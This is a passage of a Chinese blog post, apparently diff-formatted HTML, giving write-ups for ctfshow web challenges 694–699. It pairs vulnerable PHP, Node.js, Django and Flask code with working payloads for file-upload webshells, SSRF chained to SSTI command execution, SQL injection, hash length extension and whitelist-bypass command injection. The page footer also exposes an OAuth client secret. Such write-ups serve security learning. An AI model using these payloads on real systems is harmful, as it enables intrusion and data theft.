+<pre><code>/?function=extract&amp;&amp;file=data://text/plain,&lt;?php%20phpinfo();?&gt;
+</code></pre>
+<h2 id="web694">web694</h2>
+<blockquote>
+<p>文件上传<br>
+IP伪造<br>
+目录穿越</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+$action=$_GET['action'];
+$file = substr($_GET['file'],0,3);
+$ip = array_shift(explode(&quot;,&quot;,$_SERVER['HTTP_X_FORWARDED_FOR']));
+$content = $_POST['content'];
+$path = __DIR__.DIRECTORY_SEPARATOR.$ip.DIRECTORY_SEPARATOR.$file;
+if($action=='ctfshow'){
+    file_put_contents($path,$content);
+}else{
+    highlight_file(__FILE__);
+}
+?&gt;
+</code></pre>
+<p><code>$file</code>参数只有三位，无法设置后缀为php的文件名。<code>$path</code>参数可以通过<code>X-FORWARDED-FOR</code>控制<br>
+设置成如下path</p>
+<pre><code>__DIR__/a.php/.
+</code></pre>
+<p>将<code>$file</code>参数设置为<code>.</code>，这样会识别为文件，否则会识别为目录。</p>
+<pre><code>POST /?action=ctfshow&amp;file=.
+X-FORWARDED-FOR:a.php
+
+content=&lt;?php phpinfo();?&gt;
+</code></pre>
+<h2 id="web695">web695</h2>
+<blockquote>
+<p>NodeJS组件漏洞</p>
+</blockquote>
+<pre><code class="language-js">router.post('/uploadfile', async (ctx, next) =&gt; {
+  const file = ctx.request.body.files.file;
+
+  if (!fs.existsSync(file.path)) {
+    return ctx.body = &quot;Error&quot;;
+  }
+
+  if(file.path.toString().search(&quot;/dev/fd&quot;) != -1){
+    file.path=&quot;/dev/null&quot;
+  }
+
+  const reader = fs.createReadStream(file.path);
+  let fileId = crypto.createHash('md5').update(file.name + Date.now() + SECRET).digest(&quot;hex&quot;);
+  let filePath = path.join(__dirname, 'upload/') + fileId
+  const upStream = fs.createWriteStream(filePath);
+  reader.pipe(upStream)
+  return ctx.body = &quot;Upload success ~, your fileId is here：&quot; + fileId;
+  
+});
+
+router.get('/downloadfile/:fileId', async (ctx, next) =&gt; {
+  let fileId = ctx.params.fileId;
+  ctx.attachment(fileId);
+  try {
+    await send(ctx, fileId, { root: __dirname + '/upload' });
+  }catch(e){
+    return ctx.body = &quot;no_such_file_~&quot;
+  }
+});
+</code></pre>
+<p>koa-body相关漏洞，详细信息查看<a href="https://github.com/koajs/koa-body/issues/75">isssues</a><br>
+修复建议是使用ctx.request.files代替ctx.request.body.files</p>
+<p>当使用使用后一种时，我们可以通过上传json格式数据来控制file参数的内容，以及file.name和file.path的内容。</p>
+<p>payload</p>
+<pre><code>POST /uploadfile
+Content-Type: application/json
+
+{&quot;files&quot;:{&quot;file&quot;:{&quot;name&quot;:&quot;&quot;,&quot;path&quot;:&quot;flag&quot;}}}
+</code></pre>
+<h2 id="web696">web696</h2>
+<blockquote>
+<p>Django框架<br>
+SSRF<br>
+SSTI</p>
+</blockquote>
+<p>views.py</p>
+<pre><code class="language-python">from django.shortcuts import render
+from django.http import JsonResponse
+from django.contrib.auth.models import User
+from django.contrib import auth
+from django.contrib.auth.decorators import login_required
+from .models import Token
+from .utils import ssrf_check
+import json
+import requests
+import base64
+
+
+def login(request):
+    if request.method == &quot;GET&quot;:
+        return render(request, &quot;templates/login.html&quot;)
+    elif request.method == &quot;POST&quot;:
+        try:
+            data = json.loads(request.body)
+        except ValueError:
+            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can't be unmarshal&quot;})
+        user = auth.authenticate(**data)
+        if user is not None:
+            auth.login(request, user)
+            return JsonResponse({&quot;code&quot;: 0})
+        else:
+            return JsonResponse({&quot;code&quot;: 1})
+
+
+def reg(request):
+    if request.method == &quot;GET&quot;:
+        return render(request, &quot;templates/reg.html&quot;)
+    elif request.method == &quot;POST&quot;:
+        try:
+            data = json.loads(request.body)
+        except ValueError:
+            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can't be unmarshal&quot;})
+
+        if len(User.objects.filter(username=data[&quot;username&quot;])) != 0:
+            return JsonResponse({&quot;code&quot;: 1})
+        User.objects.create_user(**data)
+        return JsonResponse({&quot;code&quot;: 0})
+
+
+@login_required
+def home(request):
+    if request.method == &quot;GET&quot;:
+        return render(request, &quot;templates/home.html&quot;)
+    elif request.method == &quot;POST&quot;:
+        white_list = [&quot;10.227.6.31:10000&quot;]
+        try:
+            data = json.loads(request.body)
+        except ValueError:
+            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can't be unmarshal&quot;})
+
+        if Token.objects.all().first().Token == data[&quot;token&quot;]:
+            try:
+                if ssrf_check(data[&quot;url&quot;], white_list):
+                    return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Hacker!&quot;})
+                else:
+                    res = requests.get(data[&quot;url&quot;], timeout=1)
+            except Exception:
+                return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request Error&quot;})
+            if res.status_code == 200:
+                return JsonResponse({&quot;code&quot;: 0, &quot;message&quot;: res.text})
+            else:
+                return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Something Wrong&quot;})
+        else:
+            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Token Error&quot;})
+
+
+def flask_rpc(request):
+    if request.META['REMOTE_ADDR'] != &quot;127.0.0.1&quot;:
+        return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Must 127.0.0.1&quot;})
+
+    methods = request.GET.get(&quot;methods&quot;)
+    url = request.GET.get(&quot;url&quot;)
+
+    if methods == &quot;GET&quot;:
+        return JsonResponse(
+            {&quot;code&quot;: 0, &quot;message&quot;: requests.get(url, headers={&quot;User-Agent&quot;: &quot;Django proxy =v=&quot;}, timeout=1).text})
+    elif methods == &quot;POST&quot;:
+        data = base64.b64decode(request.GET.get(&quot;data&quot;))
+        return JsonResponse({&quot;code&quot;: 0, &quot;message&quot;: requests.post(url, data=data,
+                                                                 headers={&quot;User-Agent&quot;: &quot;Django proxy =v=&quot;,
+                                                                          &quot;Content-Type&quot;: &quot;application/json&quot;}, timeout=1).text})
+    else:
+        return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;=3=&quot;})
+</code></pre>
+<p><code>home</code>函数处存在<code>requests.get(data[&quot;url&quot;], timeout=1)</code>，可以利用来访问<code>flask_rpc</code>函数，因为它限制只能<code>127.0.0.1</code>访问，利用<code>flask_rpc</code>函数构造POST包，访问web2中的<code>/caculator</code>,利用<code>render_template_string</code>的SSTI漏洞执行命令。</p>
+<p>但是访问home函数前需要登录，而且还需要token参数</p>
+<p>admin.py</p>
+<pre><code class="language-python">from django.contrib import admin
+from django.contrib.auth.models import Group, User
+from .models import Token
+
+
+# Register your models here.
+
+@admin.register(Token)
+class CourseModelAdmin(admin.ModelAdmin):
+    list_display = ('Token',)
+    list_display_links = None
+    list_editable = []
+
+    def save_model(self, request, obj, form, change):
+        return None
+
+    def change_view(self, request, object_id, **kwargs):
+        return None
+
+    def has_add_permission(self, request):
+        return None
+
+    def has_change_permission(self, request, obj=None):
+        return True
+
+    def has_delete_permission(self, request, obj=None):
+        return None
+
+
+admin.site.unregister(Group)
+admin.site.unregister(User)
+admin.site.site_title = &quot;Jsonhub&quot;
+admin.site.site_header = &quot;Jsonhub&quot;
+</code></pre>
+<p>我们注册一个有管理员权限的账号来查看token</p>
+<p>直接偷张图<br>
+<img src="https://fallingskies22.github.io/post-images/1724845228955.png" alt="" loading="lazy"></p>
+<pre><code class="language-json">{
+&quot;username&quot;:&quot;admin&quot;,
+&quot;password&quot;:&quot;admin&quot;,
+&quot;is_staff&quot;:1,
+&quot;is_superuser&quot;:1
+}
+</code></pre>
+<p>注册用户<br>
+<img src="https://fallingskies22.github.io/post-images/1724845456665.png" alt="" loading="lazy"></p>
+<p>登录<br>
+<img src="https://fallingskies22.github.io/post-images/1724845462595.png" alt="" loading="lazy"></p>
+<p>使用cookie获取token<br>
+<img src="https://fallingskies22.github.io/post-images/1724845466623.png" alt="" loading="lazy"></p>
+<p>payload</p>
+<pre><code>{&quot;url&quot;:&quot;http://127.0.0.1:8000/rpc?methods=POST&amp;url=http://127.0.0.1:5000/caculator&amp;data=xxxx&quot;,&quot;token&quot;:&quot;06eb4a4770ceec683fa2639bda341266&quot;}
+</code></pre>
+<p>web2/app.py</p>
+<pre><code class="language-python">from flask import Flask, request, render_template_string, abort
+import re
+import json
+import string, random
+
+app = Flask(__name__)
+
+
+def log():
+    if request.method == &quot;GET&quot;:
+        s = &quot;GET {}&quot;.format(request.url)
+
+    elif request.method == &quot;POST&quot;:
+        s = &quot;POST {}\n{}&quot;.format(request.url, request.data)
+    else:
+        s = &quot;Error! {}&quot;.format(request.method)
+    with open(&quot;/var/tmp/flask.log&quot;, &quot;wb&quot;) as log:
+        log.write(s.encode(&quot;utf8&quot;))
+        log.write(b&quot;\n&quot;)
+
+
+@app.before_request
+def before_request():
+    data = str(request.data)
+    log()
+    if &quot;{{&quot; in data or &quot;}}&quot; in data or &quot;{%&quot; in data or &quot;%}&quot; in data:
+        abort(401)
+
+
+@app.route('/')
+def index():
+    return &quot;flag{&quot; + ''.join(random.choices(string.ascii_letters + string.digits, k=32)) + &quot;}&quot;
+
+
+@app.route('/admin')
+def whoami():
+    return __import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()
+
+
+@app.route('/caculator', methods=[&quot;POST&quot;])
+def caculator():
+    try:
+        data = request.get_json()
+    except ValueError:
+        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can't be unmarshal&quot;})
+    num1 = str(data[&quot;num1&quot;])
+    num2 = str(data[&quot;num2&quot;])
+    symbols = data[&quot;symbols&quot;]
+    if re.search(&quot;[a-z]&quot;, num1, re.I) or re.search(&quot;[a-z]&quot;, num2, re.I) or not re.search(&quot;[+\-*/]&quot;, symbols):
+        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;?&quot;})
+
+    return render_template_string(str(num1) + symbols + str(num2) + &quot;=&quot; + &quot;?&quot;)
+
+
+if __name__ == '__main__':
+    app.run(host=&quot;0.0.0.0&quot;)
+</code></pre>
+<p>这里symbol参数没有过滤只需要含有<code>[+\-*/]&quot;</code>，可以注入ssti代码，再<code>before_request</code>函数中对传入数据data进行了过滤，不能含有<code>{{</code>,<code>}}</code>以及<code>{%</code>,<code>%}</code>，但刚好这里是通过json传入的数据，在json中可以通过unicode编码来绕过。</p>
+<pre><code class="language-json">{&quot;symbols&quot;:&quot;\u007b\u007bx.__init__.__globals__['__builtins__'].eval('__import__(\&quot;os\&quot;).popen(\&quot;cat /flag\&quot;).read()')\u007d\u007d-&quot;,&quot;num1&quot;:&quot;1&quot;,&quot;num2&quot;:&quot;2&quot;}
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://fallingskies22.github.io/post-images/1724846975921.png" alt="" loading="lazy"></figure>
+<h2 id="web697">web697</h2>
+<blockquote>
+<p>PHP tricks<br>
+SQL注入</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+				$NOHO=isset($_GET['NOHO'])?$_GET['NOHO']:die('&lt;p&gt;Parameter NOHO:The Number Of Higher Organisms&lt;/p&gt;');
+				if ($NOHO&lt;7400000000)
+					die('&lt;p&gt;Infinite gloves AI:Obviously,The Number of higher organisms is too small!!&lt;p&gt;');
+				else{
+					if (@strlen($NOHO)&gt;2)
+						die('&lt;p&gt;Infinite gloves AI:The lenth of entered number is too long(&gt;2).&lt;p&gt;');
+				}
+				if (isset($_POST['password'])) {
+					$r = @mysqli_query($con,&quot;SELECT master FROM secret WHERE password = binary '&quot; . md5($_POST['password'], true) . &quot;'&quot;);
+					echo &quot;&lt;!--SELECT master FROM secret WHERE password = binary '&quot; . md5($_POST['password'], true) . &quot;'&quot;.&quot;--&gt;&quot;;
+
+					if (@mysqli_num_rows($r) &lt; 1)
+						echo &quot;&lt;p&gt;You are not Thanos!!&lt;/p&gt;&quot;;
+					else {
+						$row = @mysqli_fetch_assoc($r);
+
+						$login = $row['master'];
+						echo &quot;&lt;p&gt;Hi &lt;b&gt;$login&lt;/b&gt;!&lt;br/&gt;&lt;/p&gt;&quot;;
+						echo &quot;&lt;table border=1 style='margin:auto'&gt;&lt;tr&gt;&lt;th&gt;suspend code&lt;/th&gt;&lt;/tr&gt;&quot;;
+						mysqli_free_result($r);
+						$r = @mysqli_query($con,&quot;SELECT suspend_code FROM secret&quot;);
+						while ($row = @mysqli_fetch_assoc($r))
+							echo &quot;&lt;tr&gt;&lt;td&gt;{$row['suspend_code']}&lt;/td&gt;&lt;/tr&gt;&quot;;
+						echo &quot;&lt;/table&gt;&quot;;
+						mysqli_free_result($r);
+						mysqli_close($con);
+					}
+				}
+				else {
+			?&gt;
+</code></pre>
+<p>使用<code>?NOHO[]=</code>，$NOHO的值会为NULL，NULL作大小比较时都会返回false。</p>
+<p>写个php脚本爆破，使MD5后的hex数据刚好含有<code>'='</code>的hex值(273D27),即可使查询返回true。<br>
+分析：此时语句变成了SELECT master FROM secret WHERE password = 'BBB'='CCC'，假设password='AAA'，那么在执行sql查询的时候，语句的优先级是这样的：('AAA'='BBB')='CCC'<br>
+很明显'AAA'不等于'BBB'，所以'AAA'='BBB'返回0，语句变成了0='CCC',当这里的数字和字符串比较的时候，Mysql会将字符串转换为数字，这里的'CCC'被转换为0,0=0为真返回1，最后成功构造闭合sql语句，使查询返回true.</p>
+<pre><code class="language-php">&lt;?php
+for ($i = 0;$i &lt; 9e6;$i++) {
+    if (stripos(md5($i, true), &quot;'='&quot;) !== false)
+        echo &quot;md5($i) = &quot; . md5($i, true).&quot;&lt;/br&gt;&quot;;
+}
+?&gt;
+</code></pre>
+<h2 id="web698">web698</h2>
+<blockquote>
+<p>哈希长度扩展攻击</p>
+</blockquote>
+<p>参考文章<a href="https://ctf.org.cn/2019/11/19/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E4%BB%A5%E5%8F%8AHashPump%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E5%92%8C%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE/">哈希长度扩展攻击以及HashPump安装使用和两道题目</a></p>
+<p>使用工具<a href="https://github.com/shellfeel/hash-ext-attack">hash-ext-attack</a></p>
+<pre><code class="language-php">&lt;?php
+@error_reporting(0);
+
+$flag = &quot;flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxx}&quot;;
+$secret_key = &quot;xxxxxxxxxxxxxxxx&quot;; // the key is safe! no one can know except me
+$username = $_POST[&quot;username&quot;];
+$password = $_POST[&quot;password&quot;];
+header(&quot;hash_key:&quot; . $hash_key);
+
+if (!empty($_COOKIE[&quot;getflag&quot;])) {
+    if (urldecode($username) === &quot;D0g3&quot; &amp;&amp; urldecode($password) != &quot;D0g3&quot;) {
+        if ($COOKIE[&quot;getflag&quot;] === md5($secret_key . urldecode($username . $password))) {
+            echo &quot;Great! You're in!\n&quot;;
+            die (&quot;&lt;!-- The flag is &quot;. $flag . &quot;--&gt;&quot;);
+        }
+        else {
+            die (&quot;Go out! Hacker!&quot;);
+        }
+    }
+    else {
+        die (&quot;LEAVE! You're not one of us!&quot;);
+    }
+}
+
+setcookie(&quot;sample-hash&quot;, md5($secret_key . urldecode(&quot;D0g3&quot; . &quot;D0g3&quot;)), time() + (60 * 60 * 24 * 7));
+
+if (empty($_COOKIE[&quot;source&quot;])) {
+    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));
+}
+else {
+    echo &quot;&lt;source_code&gt;&quot;;
+    }
+}
+</code></pre>
+<p>哈希扩展攻击主要是在salt未知的情况下已知md5(salt.password)===hash,我们可以构造出md5(salt.password2)===hash2,但是password2要满足一定格式，而且需要知道salt长度，这里试出来为10位（代码里明明是16个x😤）</p>
+<p><img src="https://fallingskies22.github.io/post-images/1724863785071.png" alt="" loading="lazy"><br>
+payload</p>
+<pre><code>username=D0g3&amp;password=D0g3%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00&amp;submit=submit
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://fallingskies22.github.io/post-images/1724863838707.png" alt="" loading="lazy"></figure>
+<h2 id="web699">web699</h2>
+<blockquote>
+<p>命令执行绕过</p>
+</blockquote>
+<p>设置了白名单，需要用<code>[${#}\(&lt;)'0]</code>这些字符来执行命令。</p>
+<pre><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+if(isset($_POST[&quot;cmd&quot;]))
+{
+    $test = $_POST['cmd'];
+    $white_list = str_split('${#}\\(&lt;)\'0'); 
+    $char_list = str_split($test);
+    foreach($char_list as $c){
+        if(!in_array($c,$white_list)){
+                die(&quot;Cyzcc&quot;);
+            }
+        }
+    exec($test);
+}
+?&gt;
+</code></pre>
+<p>参考文章<a href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">minbashmaxfun writeup</a></p>
+<pre><code>${##} - 计算变量长度 等于1
+$((expr)) - 算术表达式
+$((${##}&lt;&lt;${##})) - 1左移1位，等于2
+$((2#110)) - 二进制解析，等于6
+${!#} 执行bash（第一个参数是/bin/bash） 等同于$0
+$'\123' - 转换8进制为字符
+&lt;&lt;&lt;传入字符串
+</code></pre>
+<p>编写转换脚本</p>
+<pre><code class="language-python">
+# 八进制
+n = dict()
+n[0] = '${#}'
+n[1] = '${##}'
+n[2] = '$((${##}&lt;&lt;${##}))'
+n[3] = '$(($((${##}&lt;&lt;${##}))#${##}${##}))'
+n[4] = '$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))'
+n[5] = '$(($((${##}&lt;&lt;${##}))#${##}${#}${##}))'
+n[6] = '$(($((${##}&lt;&lt;${##}))#${##}${##}${#}))'
+n[7] = '$(($((${##}&lt;&lt;${##}))#${##}${##}${##}))'
+
+f = ''
+
+def str_to_oct(cmd):                                #命令转换成八进制字符串
+    s = &quot;&quot;
+    for t in cmd:
+        o = ('%s' % (oct(ord(t))))[2:]
+        s+='\\'+o   
+    return s
+
+def build(cmd):                                     #八进制字符串转换成字符
+    payload = &quot;$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\\\'&quot;                 #${!#}与$0等效
+    s = str_to_oct(cmd).split('\\')
+    for _ in s[1:]:
+        payload+=&quot;\\\\&quot;
+        for i in _:
+            payload+=n[int(i)]
+    return payload+'\\\''
+
+print(build('touch 1.txt'))
+
+</code></pre>
+<p>这里创建了文件，也访问不到，好像是题目有问题😇</p>
+<h2 id="参考文章">参考文章</h2>
+<p>https://blog.csdn.net/weixin_49656607/article/details/124065674、<br>
+https://blog.csdn.net/miuzzx/article/details/123064086</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/ctfshowquan-xian-wei-chi/">
+                  <h3 class="post-title">
+                    [ctfshow]权限维持
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
